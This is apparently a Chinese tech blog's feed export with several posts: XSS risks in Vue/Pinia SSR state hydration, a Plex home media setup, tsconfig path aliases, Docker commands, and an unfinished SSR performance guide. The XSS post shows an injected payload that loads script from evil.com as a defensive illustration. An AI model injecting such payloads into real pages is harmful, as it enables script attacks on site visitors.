        <tags>
            
            <tag> 面试题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前端安全之XSS攻击的各种手段</title>
      <link href="/2023/02/037d9452bbd0.html"/>
      <url>/2023/02/037d9452bbd0.html</url>
      
        <content type="html"><![CDATA[<h1 id="在-SSR-场景下使用-Vuex-以及-Pinia-初始化状态存在的-XSS-风险"><a href="#在-SSR-场景下使用-Vuex-以及-Pinia-初始化状态存在的-XSS-风险" class="headerlink" title="在 SSR 场景下使用 Vuex 以及 Pinia 初始化状态存在的 XSS 风险"></a>在 SSR 场景下使用 Vuex 以及 Pinia 初始化状态存在的 XSS 风险</h1><p>在 SSR 应用中，服务器预取数后，会将预取的数据暴露到全局对象中，以提供给 Vuex 或者是 Pinia 进行初始化调用。</p><p>此时，如果服务端预取的数据包含 XSS 攻击内容，则客户端将很容易收到攻击，比如在 SSR 服务中对返回给客户端的 HTML 拼接如下内容：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> state = &#123;</span><br><span class="line">  <span class="attr">userinput</span>: <span class="string">`&lt;/script&gt;&lt;script src=&#x27;https://evil.com/mwahaha.js&#x27;&gt;`</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> template = <span class="string">`</span></span><br><span class="line"><span class="string">&lt;script&gt;</span></span><br><span class="line"><span class="string">  // NEVER DO THIS</span></span><br><span class="line"><span class="string">  var preloaded = <span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(state)&#125;</span>;</span></span><br><span class="line"><span class="string">&lt;/script&gt;`</span>;</span><br></pre></td></tr></table></figure><p>在客户端获取的 HTML 中将会包含：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="comment">// NEVER DO THIS</span></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">var</span> preloaded = &#123;<span class="string">&quot;userinput&quot;</span>:<span class="string">&quot;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&#x27;https://evil.com/mwahaha.js&#x27;</span>&gt;</span>&quot;&#125;;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这样就成功的向客户端加载了 <code>https://evil.com/mwahaha.js</code> 的内容。</p><p>为了避免此类情况的发生，可以使用 <a href="https://github.com/nuxt-contrib/devalue">@nuxt/devalue</a> 或者 <a href="https://www.npmjs.com/package/serialize-javascript">serialize-javascript</a> 解决。</p><h1 id="a-标签的-XSS-攻击"><a href="#a-标签的-XSS-攻击" class="headerlink" title="a 标签的 XSS 攻击"></a>a 标签的 XSS 攻击</h1><p>后台可以对某张卡片添加链接，前端将链接绑定在 a 标签的 href 上，但是 a 标签的 href 是可以执行 JavaScript 语句的：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;JavaScript:;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>参考：<a href="https://security.stackexchange.com/questions/11985/will-javascript-be-executed-which-is-in-an-href">https://security.stackexchange.com/questions/11985/will-javascript-be-executed-which-is-in-an-href</a></p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 浏览器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用Plex搭建家庭影音资料库</title>
      <link href="/2023/01/fee0a36a3344.html"/>
      <url>/2023/01/fee0a36a3344.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-介绍"><a href="#1-介绍" class="headerlink" title="1. 介绍"></a>1. 介绍</h1><p>Plex 是一个流媒体管理平台，分为 <strong>Plex 客户端</strong> 和 <strong>Plex 服务端</strong> 两个部分：</p><ul><li>Plex 服务端负责托管流媒体内容、存储流媒体内容进度、刮削器、对流媒体进行服务端解码等工作。</li><li>Plex 客户端负责读取服务端的流媒体内容、对影片进行本地解码播放。</li></ul><h3 id="Plex-和-NAS-是什么关系？"><a href="#Plex-和-NAS-是什么关系？" class="headerlink" title="Plex 和 NAS 是什么关系？"></a>Plex 和 NAS 是什么关系？</h3><p>NAS 是网络附属存储服务，它的本质就是一个挂载了多个硬盘的服务器，你可以通过购买专门的 NAS 设备来搭建，也可以找一台不用的电脑挂载一个硬盘并开启局域网共享来搭建，搭建完成之后就可以通过 Samba、FTP、WebDav 等文件传输协议来在本地局域网、亦或是广域网访问到硬盘中的数据。</p><p>好一些的 NAS 设备会支持 Docker，因此你可以通过安装 Plex 服务端 Docker 镜像的方式来让你的 NAS 支持 Plex，在设置 Plex 资料库时路径设置为你 NAS 挂载的硬盘的目录，这样你就可以通过 NAS 的文件管理服务来上传流媒体资源，再通过 Plex 服务进行播放。</p><p>如果你没有 NAS 设备，可以利用树莓派挂载一个硬盘的，通过为树莓派分别安装 Samba 或 WebDav 管理硬盘文件，然后再安装 Plex 服务到树莓派上，资料库路径设置为外置硬盘路径，即可达到使用 NAS 创建 Plex 服务的效果，这也是本文接下来推荐的安装方式。</p><h3 id="与其他平台的对比"><a href="#与其他平台的对比" class="headerlink" title="与其他平台的对比"></a>与其他平台的对比</h3><p>与 Plex 相似的平台还有 Emby、Jellyfin，他们的工作原理与 Plex 相同，都是服务端负责管理流媒体资料库，客户端负责播放。在这里简单讨论一下他们的区别，Jellyfin 是一个免费开源的项目，据传其开发人员是由于不满 Emby 改为收费制度后继续保持开源免费的分支项目，因此 Jellyfin 和 Emby 有很多的相似之处。</p><p>对于收费情况：</p><ul><li>Jellyfin 完全免费；</li><li>Emby 使用高级功能（硬件解码、离线下载、云同步等）付费，播放功能免费；</li><li>Plex 使用高级功能付费，如果只需要播放功能也需要花 30 元购买基础版；</li></ul><p>虽然 Plex 要交两份钱，但我还是极力推荐使用 Plex。Jellyfin 虽然开源免费，但是其客户端并不完善，硬件解码配置相当困难，同时其开源就意味着用爱发电终有结束的一天。Emby 付费，但是可以完全不花钱，仅使用其播放功能就可以了，但是其目前的软件质量和用户群体都不及 Plex。<strong>最重要选择 Plex 的原因是其客户端的解码功能比 Jellyfin 和 Emby 的客户端都要强太多</strong>，相同格式的影片，Plex 支持客户端实时解码，服务器端只需要推流到客户端即可，不需要服务端实时解码消耗资源，而 Jellyfin 和 Emby 则需要服务器端解码好后再推流到客户端，这对服务器端的压力是非常大的，对于树莓派来说，如果在服务端使用软件解码那么解码工作可能会造成树莓派直接死机，就算可以转码，播放过程也会很卡。</p><p>此外，再提一下 Kodi 和 Infuse，这两个播放器软件与 Plex、Emby、Jellyfin 完全不同，Kodi 和 Infuse 都没有服务端，他们只是一个支持 Samba、WebDav、FTP 等文件传输协议的播放器，通过读取 NAS 上的本地资源，然后在客户端解码并播放影片。如果你嫌 Plex 搭建过于麻烦，且没有多平台播放记录同步的需求，你可以选择只在你的电视或投影仪上安装一个 Kodi 即可；如果你是苹果全家桶用户（电视也用 Apple TV），并且觉得 Infuse 的价格合适，使用 Infuse 是最佳选择。</p><h1 id="2-安装"><a href="#2-安装" class="headerlink" title="2. 安装"></a>2. 安装</h1><h1 id="3-资源远程访问"><a href="#3-资源远程访问" class="headerlink" title="3. 资源远程访问"></a>3. 资源远程访问</h1><h1 id="4-账号体系"><a href="#4-账号体系" class="headerlink" title="4. 账号体系"></a>4. 账号体系</h1>]]></content>
      
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Plex </tag>
            
            <tag> RaspberryPi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>开发环境下如何使用 tsconfig 配置的 paths（路径别名）</title>
      <link href="/2022/11/4db54bd493ad.html"/>
      <url>/2022/11/4db54bd493ad.html</url>
      
        <content type="html"><![CDATA[<p>在开发基于 Typescript 的 NodeJS 项目时，我们通常会 <code>tsconfig.json</code> 中配置 <code>paths</code> 字段来设置路径别名（<a href="https://www.typescriptlang.org/tsconfig#paths">文档</a>）：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;compilerOptions&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;paths&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;@/*&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;./src/*&quot;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>但这里很容让人产生一个错误认知，很多人会意为这里配置的路径别名与 webpack 中配置的 <code>alias</code> 是一样的，我们配置完 <code>paths</code> 后就去写下如下代码：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;xxx&#125; <span class="keyword">from</span> <span class="string">&quot;@/xxx&quot;</span></span><br></pre></td></tr></table></figure><p>然后使用 tsc 进行编译或者使用 ts-node 运行代码，就必定发生如下报错：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Error: Cannot find module &#x27;@/xxx&#x27;</span><br></pre></td></tr></table></figure><p>这里我们需要认识到如下两点：</p><ol><li>在 <code>tsconfig.json</code> 中配置的路径别名，只触发 vscode 的包索引，得以让你使用代码提示来找文件路径；</li><li>tsc、ts-node 在编译 ts 文件时，不会通过 <code>tsconfig.json</code> 中配置的 <code>paths</code> 来进行包索引，你可以查看编译后的 js 文件，文件路径仍保持编码时的形态，并没有得到转换，因此在 nodejs 运行时必定会发生无法查找到模块路径的报错。</li></ol><p>为了解决上述的问题，可以使用如下解决方案：</p><h1 id="1-module-alias"><a href="#1-module-alias" class="headerlink" title="1. module-alias"></a>1. module-alias</h1><p><a href="https://www.npmjs.com/package/module-alias">module-alias</a> 是一个在运行时对模块路径进行转换的插件，你可以通过将路径别名写入到 <code>package.json</code> 或者是入口文件的顶部，即可让你的代码在运行时使用路径别名。</p><p>示例：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 入口文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 必须保证路径别名的声明代码，在所有代码引入操作前执行</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;module-alias/register&quot;</span></span><br><span class="line"><span class="keyword">import</span> moduleAlias <span class="keyword">from</span> <span class="string">&quot;module-alias&quot;</span></span><br><span class="line"><span class="keyword">import</span> path <span class="keyword">from</span> <span class="string">&quot;path&quot;</span></span><br><span class="line">moduleAlias.<span class="title function_">addAliases</span>(&#123;</span><br><span class="line">  <span class="string">&quot;@&quot;</span>: path.<span class="title function_">resolve</span>(__dirname, <span class="string">&quot;./&quot;</span>),</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用路径别名导入模块</span></span><br><span class="line"><span class="keyword">import</span> &#123; cloneDeep &#125; <span class="keyword">from</span> <span class="string">&quot;@/utils&quot;</span></span><br></pre></td></tr></table></figure><p>使用 <code>module-alias</code> 的好处是让代码在运行时进行路径解析，意为着你不需要考虑开发时和编译后的代码路径转换问题，但是这样会导致你不仅需要在 <code>tsconfig.json</code> 中写入路径别名，也需要在 <code>module-alias</code> 使用时声明路径别名。</p><p>同时运行时解析路径意味着路径解析是动态的，效率上必定会有所损失。</p><h1 id="2-tsconfig-paths"><a href="#2-tsconfig-paths" class="headerlink" title="2. tsconfig-paths"></a>2. tsconfig-paths</h1><p><a href="https://www.npmjs.com/package/tsconfig-paths">tsconfig-paths</a> 是比 <code>module-alias</code> 更好的一个替代模块，它的原理跟 <code>modules-alias</code> 是相似的，但是它会自动读取 <code>tsconfig.json/jsconfig.json</code> 中配置的路径别名，意味着你不需要二次配置，它有两种使用方式，一种是在代码入口中直接引入该包的 register：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 保证 register 先被加载</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;tsconfig-paths/register&quot;</span></span><br><span class="line"><span class="comment">// 使用路径别名导入模块</span></span><br><span class="line"><span class="keyword">import</span> &#123; cloneDeep &#125; <span class="keyword">from</span> <span class="string">&quot;@/utils&quot;</span></span><br></pre></td></tr></table></figure><p>另外一种则是通过官方推荐的在 <code>node/ts-node</code> 运行指令中使用 <a href="https://www.nodeapp.cn/cli.html#cli_r_require_module"><code>-r</code> 参数</a> 来引入 register：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># node</span></span><br><span class="line">node -r tsconfig-paths/register ./src/main.js</span><br><span class="line"><span class="comment"># ts-node</span></span><br><span class="line">ts-node -r tsconfig-paths/register ./src/main.ts</span><br></pre></td></tr></table></figure><p>如果你使用了 <code>nodemon</code> 作为开发时监听代码变更的工具，虽然 nodemon 会自动根据当前环境选择调用 node 还是 ts-node 作为代码的运行时环境，但并不会去调用 <code>tsconfig-paths/register</code>，因此我们可以编写一个 <code>nodemon.json</code> 文件来改写 node 执行代码时的行为：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;watch&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="string">&quot;./src&quot;</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;exec&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ts-node -r tsconfig-paths/register ./src/main.js&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;ext&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ts, js&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h1 id="3-使用前端编译工具解析模块别名"><a href="#3-使用前端编译工具解析模块别名" class="headerlink" title="3. 使用前端编译工具解析模块别名"></a>3. 使用前端编译工具解析模块别名</h1><p>上述的两种方案都是让代码在运行时解析文件路径，因此在运行时必定会有一定的性能损耗，这个性能损耗在开发环境下我们可以无视掉，但是在正式环境下我们还是希望可以直接生成一个可以访问的静态路径，避免路径转换带来一定的损耗。</p><p>要达到这个目的我们不得不借助前端编译工具来实现路径转换，以 rollup 为例：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> alias <span class="keyword">from</span> <span class="string">&quot;@rollup/plugin-alias&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="attr">rollupOption</span>: <span class="title class_">RollupOptions</span> = &#123;</span><br><span class="line">input,</span><br><span class="line"><span class="attr">plugins</span>: [</span><br><span class="line">  <span class="comment">// 使用 @rollup/plugin-alias 来解析路径别名</span></span><br><span class="line">  <span class="title function_">alias</span>(&#123;</span><br><span class="line"><span class="attr">entries</span>: [</span><br><span class="line">  &#123;</span><br><span class="line"><span class="attr">find</span>: <span class="string">&quot;@&quot;</span>,</span><br><span class="line"><span class="attr">replacement</span>: path.<span class="title function_">join</span>(__dirname, <span class="string">&quot;./src&quot;</span>),</span><br><span class="line">  &#125;,</span><br><span class="line">],</span><br><span class="line">  &#125;),</span><br><span class="line">  <span class="comment">// ... ...</span></span><br><span class="line">]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样编译后的代码就实实在在的转化为了一个可以被查找到的 <strong>相对路径</strong>，比如：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 编译前</span></span><br><span class="line"><span class="keyword">import</span> &#123; cloneDeep &#125; <span class="keyword">from</span> <span class="string">&quot;@/utils&quot;</span></span><br><span class="line"><span class="comment">// 编译后（编译后路径添加 `/index.js` 的行为是由 @rollup/plugin-node-resolve 插件实现的，@rollup/plugin-alias 只负责将路径别名转换为正确的相对路径）</span></span><br><span class="line"><span class="keyword">import</span> &#123; cloneDeep &#125; <span class="keyword">from</span> <span class="string">&quot;../../utils/index.js&quot;</span></span><br></pre></td></tr></table></figure><h1 id="4-总结"><a href="#4-总结" class="headerlink" title="4. 总结"></a>4. 总结</h1><ul><li><code>tsconfig.json</code> 声明的路径别名并<strong>不会</strong>被 tsc 识别并进行转换，仅供 vscode 的路径提示可以识别；</li><li>在开发环境下可以使用 <code>tsconfig-paths</code> 来做路径转换；</li><li>在最终的编译阶段，最好还是使用编译工具来进行路径转换。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 前端工程化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Typescript </tag>
            
            <tag> NodeJS </tag>
            
            <tag> 路径别名 </tag>
            
            <tag> nodemon </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker 常用指令整理</title>
      <link href="/2022/11/e446301a5ea2.html"/>
      <url>/2022/11/e446301a5ea2.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-查看信息"><a href="#1-查看信息" class="headerlink" title="1. 查看信息"></a>1. 查看信息</h1><h2 id="1-1-查看版本"><a href="#1-1-查看版本" class="headerlink" title="1.1 查看版本"></a>1.1 查看版本</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker version</span><br></pre></td></tr></table></figure><h2 id="1-2-查看系统信息"><a href="#1-2-查看系统信息" class="headerlink" title="1.2 查看系统信息"></a>1.2 查看系统信息</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker info</span><br></pre></td></tr></table></figure><h1 id="2-Container"><a href="#2-Container" class="headerlink" title="2. Container"></a>2. Container</h1><h2 id="2-1-创建-container"><a href="#2-1-创建-container" class="headerlink" title="2.1 创建 container"></a>2.1 创建 container</h2><p>docker 会先去查找本地 nginx 镜像，如果查找不到就会从远程下载</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker container run [image name]</span><br></pre></td></tr></table></figure><p>将 container 内部的端口号映射到外部：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker container run -p [实体机端口]:[docker 内端口] [image name]</span><br><span class="line"></span><br><span class="line">// eg:</span><br><span class="line">docker container run -p 80:80 nginx</span><br></pre></td></tr></table></figure><p>后台 (detached) 模式创建 container： ^3c04af</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker container run -d [image name]</span><br><span class="line"></span><br><span class="line">// eg:</span><br><span class="line">docker container run -d -p 80:80 nginx</span><br></pre></td></tr></table></figure><p>[[3. docker container run 背后发生了什么]]</p><h2 id="2-2-查看-container"><a href="#2-2-查看-container" class="headerlink" title="2.2 查看 container"></a>2.2 查看 container</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker container ls</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/26/cU1SKVl5g2O7bPF.png" alt=""></p><p>可以使用旧版本指令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker container ps</span><br><span class="line">docker ps</span><br></pre></td></tr></table></figure><p><code>ls</code> 与 <code>ps</code> 指令只能查看运行中的容器，如果想要查看所有容器，需要后缀参数 <code>-a</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker contianer ls -a</span><br></pre></td></tr></table></figure><p>列出所有的 container id（包含运行中和未运行的）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker container ls -qa</span><br></pre></td></tr></table></figure><h2 id="2-3-停止-container"><a href="#2-3-停止-container" class="headerlink" title="2.3 停止 container"></a>2.3 停止 container</h2><blockquote><p>windows 下必须手动停止，macos 在终端中结束后就自动停止</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker container stop nginx</span><br><span class="line">docker contianer stop [container id] // 使用 id 停止 docker（可以只用前两位）</span><br></pre></td></tr></table></figure><p>批量停止：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker container stop $(docker container ps -qa)</span><br></pre></td></tr></table></figure><h2 id="2-4-重启-container"><a href="#2-4-重启-container" class="headerlink" title="2.4 重启 container"></a>2.4 重启 container</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker container restart [docker id]</span><br></pre></td></tr></table></figure><h2 id="2-5-删除-container"><a href="#2-5-删除-container" class="headerlink" title="2.5 删除 container"></a>2.5 删除 container</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker container rm [contianer id]</span><br></pre></td></tr></table></figure><p>批量删除：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker container rm $(docker container ps -qa)</span><br></pre></td></tr></table></figure><p>强制删除：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker container rm [container id] -f</span><br></pre></td></tr></table></figure><h2 id="2-6-在前台查看-container"><a href="#2-6-在前台查看-container" class="headerlink" title="2.6 在前台查看 container"></a>2.6 在前台查看 container</h2><p>使用 <a href="#^3c04af"><code>-d</code></a> 指令创建的 container 如果想要在前台查看，可以使用指令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker attach [contianer id]</span><br></pre></td></tr></table></figure><p>此时在前台查看 container 时如果在 UNIX 系统环境下，<code>ctrl+c</code> 会直接退出 container。</p><h2 id="2-7-查看-container-的日志"><a href="#2-7-查看-container-的日志" class="headerlink" title="2.7 查看 container 的日志"></a>2.7 查看 container 的日志</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker container logs [container id]</span><br><span class="line">docker container logs -f [container id] // 实时打印</span><br></pre></td></tr></table></figure><h2 id="2-8-交互式运行-container"><a href="#2-8-交互式运行-container" class="headerlink" title="2.8 交互式运行 container"></a>2.8 交互式运行 container</h2><p>在启动时进入交互式模式中：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker container run -it ubuntu sh // 会打开 Ubuntu 的 shell，并且可以交互</span><br></pre></td></tr></table></figure><p>以交互式的方式进入正在运行的 container 中【常用功能】：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it [container id] sh</span><br></pre></td></tr></table></figure><blockquote><p>如果以交互式模式启动一个 container，执行 <code>exit</code> 退出时会停掉整个容器，但是以交互式方式进入正在运行中的容器并退出时，并不会退出当前的容器。</p></blockquote><h2 id="2-9-查看-container-中的进程"><a href="#2-9-查看-container-中的进程" class="headerlink" title="2.9 查看 container 中的进程"></a>2.9 查看 container 中的进程</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker container top [cotnainer id]</span><br></pre></td></tr></table></figure><h1 id="3-Image"><a href="#3-Image" class="headerlink" title="3. Image"></a>3. Image</h1><h2 id="3-1-获取镜像"><a href="#3-1-获取镜像" class="headerlink" title="3.1 获取镜像"></a>3.1 获取镜像</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker image pull [registry] # 从 registry 拉取</span><br><span class="line">docker image build from [Dockerfile] # 从 Dockerfile 构建</span><br><span class="line">docker image load form [file] # 文件导入（离线）</span><br></pre></td></tr></table></figure><h2 id="3-2-查看已有的镜像"><a href="#3-2-查看已有的镜像" class="headerlink" title="3.2 查看已有的镜像"></a>3.2 查看已有的镜像</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker image ls</span><br></pre></td></tr></table></figure><h2 id="3-3-查看镜像详细信息"><a href="#3-3-查看镜像详细信息" class="headerlink" title="3.3 查看镜像详细信息"></a>3.3 查看镜像详细信息</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker image inspect [image id]</span><br></pre></td></tr></table></figure><h2 id="3-4-删除镜像"><a href="#3-4-删除镜像" class="headerlink" title="3.4 删除镜像"></a>3.4 删除镜像</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker image rm [image id]</span><br></pre></td></tr></table></figure><blockquote><p>如果镜像被容器使用中，镜像是无法删除的</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CICD </category>
          
          <category> Docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
            <tag> 常用指令 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>服务端渲染优化指南</title>
      <link href="/2022/09/9b42d1f5468a.html"/>
      <url>/2022/09/9b42d1f5468a.html</url>
      
        <content type="html"><![CDATA[<h1 id="性能审计方案"><a href="#性能审计方案" class="headerlink" title="性能审计方案"></a>性能审计方案</h1><p>在讨论如何提升性能之前，我们首先要明确如何正确的统计性能指标，这样在后续的性能提升过程中才能有效的对比优化前后的效果。</p><p>浏览器的性能数据可以通过 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Performance">Web Performance API</a> 来获取，通过这些数据的各种推算，可以得出一些以用户为中心的性能指标，各种指标有很多的衡量方式，但是通常我们终点关注以下指标：</p><ul><li><a href="https://web.dev/i18n/zh/fcp/">First Content Paint</a>：首次内容绘制（FCP）测量页面从开始加载到页面内容的任何部分在屏幕上完成渲染的时间。对于该指标，”内容”指的是文本、图像（包括背景图像）、<code>&lt;svg&gt;</code> 元素或非白色的 <code>&lt;canvas&gt;</code> 元素。</li><li><a href="https://web.dev/i18n/zh/lcp/">Largest Contentful Paint</a>：最大内容绘制 (LCP) 指标会根据页面<a href="https://w3c.github.io/hr-time/#timeorigin-attribute">首次开始加载</a>的时间点来报告可视区域内可见的最大<a href="https://web.dev/i18n/zh/lcp/#what-elements-are-considered">图像或文本块</a>完成渲染的相对时间。</li><li><a href="https://web.dev/i18n/zh/tti/">Time to Interactive</a>：可交互时长（TTI）测量页面从开始加载到主要子资源完成渲染，并能够快速、可靠地响应用户输入所需的时间。</li><li><a href="https://web.dev/speed-index/">Speed Index</a>：速度指标（SI）是衡量页面加载期间内容的视觉显示速度，不同于 LCP，SI 会考虑到 Javascript 执行状态以及不可见内容的加载，是衡量网站最快可以让用户完整体验的指标。</li><li><a href="https://web.dev/lighthouse-total-blocking-time/">Total Blocking Time</a>：总阻塞时间（TBT）测量页面被阻止响应用户输入（例如鼠标点击、屏幕点击或按下键盘）的总时间。总和是<a href="https://web.dev/fcp/">首次内容绘制</a>和<a href="https://web.dev/tti/">互动时间</a>之间所有<a 